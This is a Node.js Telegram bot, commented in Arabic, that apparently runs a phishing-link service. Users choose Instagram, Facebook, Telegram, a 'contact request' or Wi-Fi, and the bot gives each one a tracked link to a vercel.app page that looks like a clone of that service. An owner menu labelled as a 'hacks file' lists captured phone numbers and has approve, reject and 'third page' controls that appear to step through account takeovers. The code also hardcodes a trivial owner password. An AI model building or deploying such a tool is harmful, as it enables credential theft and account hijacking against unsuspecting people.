const { TelegramBot } = require("node-telegram-bot-api");
const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const crypto = require("crypto");

// ============================================================
// 1. الإعدادات
// ============================================================

const TOKEN = process.env.BOT_TOKEN;
const PORT = process.env.PORT || 3000;
const OWNER_ID = "8425767629"; // ← ضع معرفك
const OWNER_NAME = "عمر";

const CHANNEL_LINK = "https://t.me/+di5cbj-Ef-pjZmFk";
const REQUIRED_CHANNEL_ID = "-1001234567890"; // ← غيّره

if (!TOKEN) {
    console.error("❌ BOT_TOKEN is missing");
    process.exit(1);
}

// ============================================================
// 2. تعريف البوت (هنا)
// ============================================================

const bot = new TelegramBot(TOKEN, { polling: true });
console.log("✅ Telegram Bot started");

// ============================================================
// باقي المتغيرات
// ============================================================

let isBotActive = true;
let showAppButtons = false;
let dailySecret = "12345678";
let currentSecretCode = generateSecretCode();
const acceptedUsers = new Set();
const verifiedUsers = new Set();
const waitingForSecret = new Set();
let subscribeTimer = {};

// ============================================================
// دوال مساعدة
// ============================================================

function generateSecretCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
    let code = '';
    for (let i = 0; i < 8; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

function createToken() { return crypto.randomBytes(32).toString("hex"); }
function createRequestId() { return crypto.randomBytes(16).toString("hex"); }

// ============================================================
// قاعدة البيانات
// ============================================================

const db = new sqlite3.Database("./referrals.db");
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS referrals (token TEXT PRIMARY KEY, telegram_id TEXT NOT NULL, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)`);
    db.run(`CREATE TABLE IF NOT EXISTS contact_requests (request_id TEXT PRIMARY KEY, telegram_id TEXT NOT NULL, phone TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'pending', created_at DATETIME DEFAULT CURRENT_TIMESTAMP)`);
    db.run(`CREATE TABLE IF NOT EXISTS users (telegram_id TEXT PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, is_active INTEGER DEFAULT 0, is_verified INTEGER DEFAULT 0, last_active DATETIME DEFAULT CURRENT_TIMESTAMP, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)`);
});
console.log("✅ Database ready");

// ============================================================
// Express
// ============================================================

const app = express();
app.use(express.json());
app.use((req, res, next) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    if (req.method === "OPTIONS") return res.sendStatus(204);
    next();
});

// ============================================================
// دوال DB
// ============================================================

function createReferral(telegramId) {
    return new Promise((resolve, reject) => {
        const token = createToken();
        db.run(`INSERT INTO referrals (token, telegram_id) VALUES (?, ?)`, [token, String(telegramId)], (err) => {
            if (err) reject(err);
            else resolve(token);
        });
    });
}

function getReferral(token) {
    return new Promise((resolve, reject) => {
        db.get(`SELECT * FROM referrals WHERE token = ?`, [token], (err, row) => {
            if (err) reject(err);
            else resolve(row || null);
        });
    });
}

function getRequest(requestId) {
    return new Promise((resolve, reject) => {
        db.get(`SELECT * FROM contact_requests WHERE request_id = ?`, [requestId], (err, row) => {
            if (err) reject(err);
            else resolve(row || null);
        });
    });
}

function updateRequestStatus(requestId, status) {
    return new Promise((resolve, reject) => {
        db.run(`UPDATE contact_requests SET status = ? WHERE request_id = ?`, [status, requestId], (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
}

function saveUser(telegramId, username, firstName, lastName) {
    return new Promise((resolve, reject) => {
        db.run(`INSERT OR REPLACE INTO users (telegram_id, username, first_name, last_name, last_active) VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)`,
            [String(telegramId), username || null, firstName || null, lastName || null], (err) => {
                if (err) reject(err);
                else resolve();
            });
    });
}

function verifyUser(telegramId) {
    return new Promise((resolve, reject) => {
        db.run(`UPDATE users SET is_verified = 1, is_active = 1 WHERE telegram_id = ?`, [String(telegramId)], (err) => {
            if (err) reject(err);
            else { verifiedUsers.add(String(telegramId)); resolve(); }
        });
    });
}

function isUserVerified(telegramId) {
    return new Promise((resolve, reject) => {
        db.get(`SELECT is_verified FROM users WHERE telegram_id = ?`, [String(telegramId)], (err, row) => {
            if (err) reject(err);
            else resolve(row ? row.is_verified === 1 : false);
        });
    });
}

function getActiveUsersCount() {
    return new Promise((resolve, reject) => {
        db.get(`SELECT COUNT(*) as count FROM users WHERE is_active = 1 AND is_verified = 1`, [], (err, row) => {
            if (err) reject(err);
            else resolve(row ? row.count : 0);
        });
    });
}

function getActiveUsers() {
    return new Promise((resolve, reject) => {
        db.all(`SELECT telegram_id, username, first_name, last_name, last_active, created_at FROM users WHERE is_active = 1 AND is_verified = 1 ORDER BY created_at DESC`, [], (err, rows) => {
            if (err) reject(err);
            else resolve(rows || []);
        });
    });
}

function getAllReferrals(telegramId) {
    return new Promise((resolve, reject) => {
        db.all(`SELECT token, created_at FROM referrals WHERE telegram_id = ? ORDER BY created_at DESC`, [String(telegramId)], (err, rows) => {
            if (err) reject(err);
            else resolve(rows || []);
        });
    });
}

function getAllContactRequests() {
    return new Promise((resolve, reject) => {
        db.all(`SELECT request_id, telegram_id, phone, status, created_at FROM contact_requests ORDER BY created_at DESC`, [], (err, rows) => {
            if (err) reject(err);
            else resolve(rows || []);
        });
    });
}

// ============================================================
// دوال البوت
// ============================================================

async function isUserInChannel(telegramId) {
    try {
        const member = await bot.getChatMember(REQUIRED_CHANNEL_ID, telegramId);
        if (member.status === 'left' || member.status === 'kicked') return { inChannel: false };
        return { inChannel: true };
    } catch (error) {
        return { inChannel: false };
    }
}

function sendOwnerMenu(chatId) {
    let buttons = [
        [{ text: "📊 عدد المستخدمين", callback_data: "users_count" }],
        [{ text: isBotActive ? "⏸ إيقاف البوت" : "▶️ تشغيل البوت", callback_data: "toggle_bot" }],
        [{ text: "🔑 كلمة السر", callback_data: "show_secret" }],
        [{ text: "📋 قائمة المستخدمين", callback_data: "users_list" }],
        [{ text: "📁 ملف الاختراقات", callback_data: "hack_file" }]
    ];

    if (showAppButtons) {
        buttons.push([{ text: "🙈 إخفاء الأزرار", callback_data: "hide_buttons" }]);
        buttons.push([
            { text: "📸 Instagram", callback_data: "instagram" },
            { text: "📘 Facebook", callback_data: "facebook" }
        ]);
        buttons.push([
            { text: "✈️ Telegram", callback_data: "telegram" },
            { text: "📞 طلب اتصال", callback_data: "contact" }
        ]);
        buttons.push([{ text: "📶 Wi-Fi", callback_data: "wifi" }]);
        buttons.push([{ text: "🔗 الـ REF", callback_data: "show_refs" }]);
    } else {
        buttons.push([{ text: "👁️ إظهار الأزرار", callback_data: "show_buttons" }]);
    }

    return bot.sendMessage(
        chatId,
        `🖥️ مرحبا بالسيد ${OWNER_NAME}\n👑 Hello King ${OWNER_NAME}`,
        { reply_markup: { inline_keyboard: buttons } }
    );
}

function sendUserMenu(chatId) {
    return bot.sendMessage(
        chatId,
        `🔓 اختر الخدمة:`,
        {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "📸 Instagram", callback_data: "instagram" },
                        { text: "📘 Facebook", callback_data: "facebook" }
                    ],
                    [
                        { text: "✈️ Telegram", callback_data: "telegram" },
                        { text: "📞 طلب اتصال", callback_data: "contact" }
                    ],
                    [{ text: "📶 Wi-Fi", callback_data: "wifi" }]
                ]
            }
        }
    );
}

// ============================================================
// أوامر البوت (bot.onText) - هنا بعد تعريف البوت
// ============================================================

bot.onText(/\/start$/, async (msg) => {
    try {
        const chatId = msg.chat.id;
        const firstName = msg.from?.first_name || "غير معروف";
        const lastName = msg.from?.last_name || "";
        const username = msg.from?.username ? `@${msg.from.username}` : "لا يوجد";
        await saveUser(chatId, username, firstName, lastName);

        if (String(chatId) === OWNER_ID) {
            if (!acceptedUsers.has(chatId)) {
                return bot.sendMessage(
                    chatId,
                    `🔐 *أدخل كلمة السر اليومية:*\n\n📌 يرجى إدخال كلمة السر التي تم إرسالها في المجموعة.`,
                    { parse_mode: 'Markdown' }
                );
            }
            return sendOwnerMenu(chatId);
        }

        if (!isBotActive) {
            return bot.sendMessage(chatId, `⛔ البوت موقف حالياً.`);
        }

        if (subscribeTimer[chatId] && subscribeTimer[chatId] === 'waiting') {
            return bot.sendMessage(
                chatId,
                `⏳ *جاري التحقق من الاشتراك...*\n\n📌 يرجى الانتظار 5 ثوانٍ حتى يتم التأكيد.`,
                { parse_mode: 'Markdown' }
            );
        }

        const result = await isUserInChannel(chatId);

        if (!result.inChannel) {
            subscribeTimer[chatId] = 'waiting';

            await bot.sendMessage(
                chatId,
                `⚠️ *يرجى الاشتراك في القناة أولاً* 🔗\n\n` +
                `📌 للاستفادة من خدمات البوت، يجب أن تكون مشتركاً في قناتنا.\n\n` +
                `🔗 *رابط القناة:*\n${CHANNEL_LINK}\n\n` +
                `⏳ *لديك 5 ثوانٍ للاشتراك، بعدها سينتهي الزر.*`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🔄 اشتركت! تحقق الآن", callback_data: "check_subscribe" }]
                        ]
                    }
                }
            );

            setTimeout(() => {
                if (subscribeTimer[chatId] === 'waiting') {
                    subscribeTimer[chatId] = 'expired';
                    bot.sendMessage(
                        chatId,
                        `⏰ *انتهى الوقت!*\n\n📌 يرجى الضغط على /start مرة أخرى لإعادة المحاولة.`,
                        { parse_mode: 'Markdown' }
                    );
                }
            }, 5000);

            return;
        }

        subscribeTimer[chatId] = 'done';

        const isVerified = await isUserVerified(chatId);
        if (!isVerified && !verifiedUsers.has(String(chatId))) {
            return bot.sendMessage(
                chatId,
                `📋 *شروط الاستخدام:*\n\n` +
                `⚠️ أنا غير مسؤول عن أي استخدام غير لائق أو غير رسمي للبوت.\n\n` +
                `✅ باستخدامك للبوت، أنت توافق على هذه الشروط.\n\n` +
                `🆔 *معرفك:* \`${chatId}\``,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "✅ أوافق على الشروط", callback_data: "accept_terms" }]
                        ]
                    }
                }
            );
        }

        if (!acceptedUsers.has(chatId)) acceptedUsers.add(chatId);
        return sendUserMenu(chatId);

    } catch (error) {
        console.error("❌ Start error:", error);
    }
});

bot.onText(/\/channelid$/, async (msg) => {
    const chatId = msg.chat.id;
    if (msg.chat.type === 'channel' || msg.chat.type === 'group' || msg.chat.type === 'supergroup') {
        bot.sendMessage(chatId, `🆔 معرف هذه القناة/المجموعة: \`${chatId}\``, { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(chatId, `⚠️ هذه ليست قناة أو مجموعة.`);
    }
});

// ============================================================
// معالجة الرسائل النصية (كلمة السر)
// ============================================================

bot.on('message', async (msg) => {
    try {
        const chatId = String(msg.chat.id);
        const text = msg.text;

        if (chatId === OWNER_ID && !acceptedUsers.has(chatId)) {
            if (text === dailySecret) {
                acceptedUsers.add(chatId);
                await bot.sendMessage(chatId, `✅ *تم التحقق بنجاح!*\n\n📌 مرحباً بك أيها السيد ${OWNER_NAME}`, { parse_mode: 'Markdown' });
                return sendOwnerMenu(chatId);
            } else if (text !== '/start') {
                await bot.sendMessage(chatId, `❌ *كلمة السر غير صحيحة!*\n\n📌 يرجى المحاولة مرة أخرى.`, { parse_mode: 'Markdown' });
            }
            return;
        }

        if (waitingForSecret.has(chatId)) {
            if (text === currentSecretCode) {
                await verifyUser(chatId);
                waitingForSecret.delete(chatId);
                await bot.sendMessage(chatId, `✅ تم التحقق!\n📌 اضغط /start`);
            } else {
                await bot.sendMessage(chatId, `❌ كلمة السر غير صحيحة!\n📝 أعد المحاولة.`);
            }
        }
    } catch (error) {
        console.error("❌ Message error:", error);
    }
});

// ============================================================
// معالجة الأزرار (callback_query)
// ============================================================

bot.on("callback_query", async (query) => {
    try {
        const chatId = query.message.chat.id;
        const data = query.data;

        // =================================================
        // أزرار المالك
        // =================================================

        if (String(chatId) === OWNER_ID) {
            if (data === "hack_file") {
                const requests = await getAllContactRequests();
                let text = `📁 *ملف الاختراقات*\n\n`;
                text += `📋 *جميع الطلبات المسجلة:*\n`;

                if (requests.length === 0) {
                    text += `\n⚠️ لا توجد طلبات بعد.`;
                } else {
                    requests.forEach((req, index) => {
                        text += `\n${index + 1}. 📱 *رقم:* ${req.phone}`;
                        text += `\n   🆔 *ID:* ${req.request_id}`;
                        text += `\n   👤 *المستخدم:* ${req.telegram_id}`;
                        text += `\n   📊 *الحالة:* ${req.status}`;
                        text += `\n   📅 *التاريخ:* ${req.created_at}`;
                        text += `\n   ${'─'.repeat(20)}`;
                    });
                }

                await bot.answerCallbackQuery(query.id);
                await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
                return;
            }

            if (data === "show_buttons") {
                showAppButtons = true;
                await bot.answerCallbackQuery(query.id, { text: "✅ تم الإظهار" });
                return sendOwnerMenu(chatId);
            }
            if (data === "hide_buttons") {
                showAppButtons = false;
                await bot.answerCallbackQuery(query.id, { text: "🙈 تم الإخفاء" });
                return sendOwnerMenu(chatId);
            }
            if (data === "show_refs") {
                const refs = await getAllReferrals(chatId);
                let text = `🔗 روابط REF:\n`;
                if (refs.length === 0) text += `لا يوجد`;
                else refs.forEach((r, i) => text += `\n${i+1}. \`${r.token}\``);
                await bot.answerCallbackQuery(query.id);
                return bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
            }
            if (data === "users_count") {
                const count = await getActiveUsersCount();
                await bot.answerCallbackQuery(query.id);
                return bot.sendMessage(chatId, `👥 المستخدمين النشطين: ${count}`);
            }
            if (data === "users_list") {
                const list = await getActiveUsers();
                let text = `📋 قائمة المستخدمين:\n`;
                if (list.length === 0) text += `لا يوجد`;
                else list.forEach((u, i) => {
                    const name = u.first_name || u.username || "غير معروف";
                    text += `\n${i+1}. ${name} 🆔 ${u.telegram_id}`;
                });
                await bot.answerCallbackQuery(query.id);
                return bot.sendMessage(chatId, text);
            }
            if (data === "show_secret") {
                await bot.answerCallbackQuery(query.id);
                return bot.sendMessage(chatId, `🔑 كلمة السر: \`${currentSecretCode}\``, { parse_mode: 'Markdown' });
            }
            if (data === "toggle_bot") {
                isBotActive = !isBotActive;
                await bot.answerCallbackQuery(query.id, { text: isBotActive ? "✅ تم التشغيل" : "⏸ تم الإيقاف" });
                return sendOwnerMenu(chatId);
            }
        }

        // =================================================
        // زر التحقق من الاشتراك
        // =================================================

        if (data === "check_subscribe") {
            if (subscribeTimer[chatId] === 'expired') {
                await bot.answerCallbackQuery(query.id, { text: "⏰ انتهى الوقت! اضغط /start مرة أخرى" });
                return bot.sendMessage(
                    chatId,
                    `⏰ *انتهى الوقت!*\n\n📌 يرجى الضغط على /start مرة أخرى لإعادة المحاولة.`,
                    { parse_mode: 'Markdown' }
                );
            }

            if (subscribeTimer[chatId] !== 'waiting') {
                await bot.answerCallbackQuery(query.id, { text: "⚠️ يرجى الضغط على /start أولاً" });
                return;
            }

            const result = await isUserInChannel(chatId);
            if (result.inChannel) {
                subscribeTimer[chatId] = 'done';
                await bot.answerCallbackQuery(query.id, { text: "✅ تم التأكيد! أنت مشترك" });
                bot.emit('text', { chat: { id: chatId }, from: query.from, text: '/start' });
            } else {
                await bot.answerCallbackQuery(query.id, { text: "❌ لا تزال غير مشترك" });
                await bot.sendMessage(
                    chatId,
                    `❌ *لا نراك مشتركاً بعد.*\n\n` +
                    `🔗 *رابط القناة:*\n${CHANNEL_LINK}\n\n` +
                    `✅ بعد الاشتراك، اضغط على الزر مرة أخرى.`,
                    {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "🔄 تحقق مرة أخرى", callback_data: "check_subscribe" }]
                            ]
                        }
                    }
                );
            }
            return;
        }

        // =================================================
        // التحقق من القناة للمستخدمين العاديين
        // =================================================

        if (String(chatId) !== OWNER_ID) {
            const result = await isUserInChannel(chatId);
            if (!result.inChannel) {
                await bot.answerCallbackQuery(query.id, { text: "⚠️ اشترك في القناة أولاً!" });
                return bot.sendMessage(
                    chatId,
                    `⚠️ يرجى الاشتراك في القناة أولاً:\n${CHANNEL_LINK}\n\n🔄 بعد الاشتراك، اضغط /start`,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "🔄 تحقق من الاشتراك", callback_data: "check_subscribe" }]
                            ]
                        }
                    }
                );
            }
        }

        if (!isBotActive && String(chatId) !== OWNER_ID) {
            return bot.answerCallbackQuery(query.id, { text: "⛔ البوت موقف" });
        }

        // =================================================
        // قبول الشروط
        // =================================================

        if (data === "accept_terms") {
            acceptedUsers.add(chatId);
            await verifyUser(chatId);
            await bot.answerCallbackQuery(query.id, { text: "✅ تم قبول الشروط" });
            await bot.sendMessage(
                chatId,
                `✅ *تم قبول الشروط.*\n\n🆔 *معرفك:* \`${chatId}\`\n\n📌 *اضغط /start للبدء.*`,
                { parse_mode: 'Markdown' }
            );
            return;
        }

        // =================================================
        // قبول/رفض الطلبات
        // =================================================

        if (data.startsWith("approve:")) {
            const id = data.split(":")[1];
            await updateRequestStatus(id, "approved");
            await bot.answerCallbackQuery(query.id, { text: "✅ تم القبول" });
            await bot.sendMessage(chatId, `✅ تم قبول الطلب (رقم: ${id})`);
            return;
        }
        if (data.startsWith("reject:")) {
            const id = data.split(":")[1];
            await updateRequestStatus(id, "rejected");
            await bot.answerCallbackQuery(query.id, { text: "❌ تم الرفض" });
            await bot.sendMessage(chatId, `❌ تم رفض الطلب (رقم: ${id})`);
            return;
        }
        if (data.startsWith("third_page:")) {
            const id = data.split(":")[1];
            await updateRequestStatus(id, "third_page");
            await bot.answerCallbackQuery(query.id, { text: "🔑 تم الانتقال" });
            await bot.sendMessage(chatId, `🔑 تم الانتقال للصفحة الثالثة (رقم: ${id})`);
            return;
        }

        // =================================================
        // الموافقة على الشروط
        // =================================================

        if (!acceptedUsers.has(chatId) && String(chatId) !== OWNER_ID) {
            await bot.answerCallbackQuery(query.id, { text: "⚠️ وافق على الشروط أولاً" });
            return bot.sendMessage(chatId, `⚠️ يرجى الموافقة على الشروط أولاً.\nاضغط /start`);
        }

        // =================================================
        // الخدمات
        // =================================================

        const websites = {
            instagram: "https://instagram-two-henna.vercel.app/",
            facebook: "https://facebook-ruby-one.vercel.app/",
            telegram: "https://telegram-one-rho.vercel.app/",
            contact: "https://telegram-one-rho.vercel.app/",
            wifi: "https://wifi-free-gamma.vercel.app/"
        };

        const url = websites[data];
        if (!url) return bot.answerCallbackQuery(query.id);

        const token = await createReferral(chatId);
        const sep = url.includes("?") ? "&" : "?";
        const link = `${url}${sep}ref=${token}`;

        await bot.answerCallbackQuery(query.id, { text: "✅ تم إنشاء الرابط" });
        await bot.sendMessage(chatId, `🔗 رابطك:\n${link}`);

    } catch (error) {
        console.error("❌ Callback error:", error);
    }
});

// ============================================================
// أخطاء الـ Polling
// ============================================================

bot.on("polling_error", (error) => {
    console.error("❌ Telegram polling error:", error.message);
});

// ============================================================
// تشغيل السيرفر
// ============================================================

app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 Bot running on port ${PORT}`);
    console.log(`🔑 كلمة السر اليومية: ${dailySecret}`);
    console.log(`📌 القناة المطلوبة: ${CHANNEL_LINK}`);
});
